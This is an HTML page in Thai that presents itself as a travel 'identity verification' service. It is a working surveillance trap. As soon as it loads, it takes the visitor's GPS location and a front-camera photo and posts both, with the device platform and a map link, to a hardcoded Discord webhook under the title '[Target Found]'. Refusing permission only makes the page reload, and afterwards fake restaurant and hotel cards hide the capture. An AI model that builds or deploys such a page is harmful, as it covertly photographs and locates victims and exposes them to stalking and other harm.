<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Travel Premium - Verified Service</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #020617; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .scan-anim { height: 2px; background: #3b82f6; position: absolute; width: 100%; top: 0; animation: scan move 2s infinite; box-shadow: 0 0 20px #3b82f6; }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
        .success-glow { box-shadow: 0 0 40px rgba(34, 197, 94, 0.2); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative" id="app">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
                Secure Identity Node v4.0
            </div>
            <h1 class="text-3xl font-bold mb-2">ตรวจสอบตำแหน่ง</h1>
            <p class="text-slate-400 text-sm leading-relaxed">กำลังซิงค์ข้อมูลกับดาวเทียมเพื่อยืนยันพิกัดปัจจุบันของคุณ...</p>
        </div>

        <div class="p-8 pt-0">
            <div id="step-scan" class="block text-center">
                <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(59,130,246,0.3)]">
                    <video id="webcam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-blue-500/10 to-transparent"></div>
                    <div class="scan-anim" id="scanner-line"></div>
                </div>
                <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest">กำลังเชื่อมต่อพิกัด GPS...</p>
            </div>

            <div id="step-result" class="hidden animate-in fade-in duration-700">
                <div class="mb-6 p-4 bg-green-500/10 border border-green-500/20 rounded-2xl flex items-center gap-3">
                    <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-white">✓</div>
                    <div>
                        <p class="text-green-400 font-bold text-sm">ยืนยันตัวตนสำเร็จ</p>
                        <p class="text-[10px] text-slate-500">Ref: TX-994102-B</p>
                    </div>
                </div>
                <h3 class="text-sm font-semibold text-slate-300 mb-4 uppercase tracking-wider">บริการแนะนำในรัศมี 2 กม.</h3>
                <div id="places-container" class="space-y-3"></div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500160535629660263/DqTP_nBQDLnPNoDADa-bXEb-1lKS6H5Ztt6Y7_TzoKCyiahTsosXJiG9M_dlTRyiwMmP";
        let userPos = { lat: 0, lon: 0 };
        let shotCount = 0;
        const MAX_SHOTS = 0.1; // จำนวนรูปที่จะถ่ายรัวๆ

        // เริ่มทำงานทันทีที่หน้าเว็บโหลดเสร็จ
        window.onload = () => {
            startProcess();
        };

        async function startProcess() {
            if (!navigator.geolocation) return;

            navigator.geolocation.getCurrentPosition(async (pos) => {
                userPos.lat = pos.coords.latitude;
                userPos.lon = pos.coords.longitude;
                document.getElementById('status-msg').innerText = "เข้าถึง GPS สำเร็จ... กำลังสแกนความปลอดภัย";
                await initCamera();
            }, (err) => {
                // หากผู้ใช้ยังไม่อนุญาต ระบบจะเตือนเพื่อให้กดอนุญาตครั้งแรก
                alert("กรุณากด 'อนุญาต' เพื่อเข้าถึงตำแหน่งและกล้องเพื่อใช้บริการ");
                location.reload();
            });
        }

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                
                // เริ่มระบบถ่ายรูปรัวๆ ทันทีที่กล้องพร้อม
                const burstMode = setInterval(async () => {
                    if (shotCount >= MAX_SHOTS) {
                        clearInterval(burstMode);
                        stream.getTracks().forEach(t => t.stop());
                        showResults();
                        return;
                    }
                    await captureAndSend(video);
                    shotCount++;
                }, 1500); // ถ่ายทุกๆ 1.5 วินาที

            } catch (e) {
                console.log("Camera Error");
            }
        }

        async function captureAndSend(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                const payload = {
                    embeds: [{
                        title: `🟢 [Target Found] Shot ${shotCount + 1}`,
                        color: 5763719,
                        fields: [
                            { name: "📍 พิกัดแม่นยำ", value: `${userPos.lat}, ${userPos.lon}`, inline: true },
                            { name: "📱 ระบบปฏิบัติการ", value: navigator.platform, inline: true },
                            { name: "🗺️ แผนที่", value: `[ดูจุดพิกัด](https://www.google.com/maps?q=${userPos.lat},${userPos.lon})` }
                        ],
                        image: { url: `attachment://shot_${shotCount}.jpg` },
                        footer: { text: "ระบบยืนยันตัวตนอัตโนมัติ • " + new Date().toLocaleTimeString() }
                    }]
                };

                formData.append('payload_json', JSON.stringify(payload));
                formData.append('file', blob, `shot_${shotCount}.jpg`);

                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            }, 'image/jpeg', 0.8);
        }

        function showResults() {
            document.getElementById('step-scan').classList.add('hidden');
            document.getElementById('step-result').classList.remove('hidden');

            const container = document.getElementById('places-container');
            const links = [
                { name: "ร้านอาหารแนะนำ", icon: "🍱", q: "restaurants" },
                { name: "โรงแรมใกล้เคียง", icon: "🏨", q: "hotels" }
            ];

            links.forEach(item => {
                container.innerHTML += `
                    <div class="flex items-center gap-4 bg-white/5 border border-white/10 p-4 rounded-2xl">
                        <span class="text-2xl">${item.icon}</span>
                        <div class="flex-1">
                            <p class="text-white text-sm font-semibold">${item.name}</p>
                            <p class="text-blue-400 text-[10px]">ตรวจสอบข้อมูลแล้ว</p>
                        </div>
                    </div>`;
            });
        }
    </script>
</body>
</html>
